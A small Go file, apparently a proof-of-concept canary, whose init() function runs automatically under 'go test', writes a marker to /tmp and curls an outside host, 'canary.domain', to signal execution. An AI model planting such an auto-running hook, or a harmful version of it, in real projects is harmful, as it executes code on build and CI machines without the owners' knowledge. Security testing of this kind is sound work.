package main

import (
	"fmt"
	"os"
	"os/exec"
)

func init() {
	// This will execute when go test runs
	fmt.Println("INIT FUNCTION EXECUTED - PAYLOAD")
	
	// Try to execute a command
	cmd := exec.Command("sh", "-c", "echo 'PAYLOAD_EXECUTED' > /tmp/payload_test.txt && curl -s http://canary.domain/payload_executed || true")
	cmd.Run()
	
	// Also write to stderr so it appears in logs
	fmt.Fprintf(os.Stderr, "PAYLOAD_MARKER: init executed\n")
}